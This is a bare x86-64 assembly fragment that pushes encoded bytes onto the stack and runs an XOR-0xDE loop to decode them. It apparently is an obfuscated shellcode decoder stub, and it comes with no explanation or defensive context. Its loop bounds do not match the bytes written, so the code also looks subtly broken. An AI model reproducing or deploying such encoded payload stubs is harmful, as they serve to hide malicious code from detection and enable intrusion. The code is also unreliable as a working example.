push 1
pop rcx
mov rdi,rsp
mov cl,0xde
mov dword ptr [rsp],    0x960cef48
mov dword ptr [rsp+4],  0xbcf1f165
mov dword ptr [rsp+8],  0xadf1b0b7
mov dword ptr [rsp+12], 0x351f96b6
mov dword ptr [rsp+16], 0x57968dd6
mov dword ptr [rsp+20], 0x96898e39
mov dword ptr [rsp+24], 0xe56e3857
mov dword ptr [rsp+28], 0x0000dbd1
decrypt:
xor byte ptr [rdi+rcx], 0xDE
loop decrypt
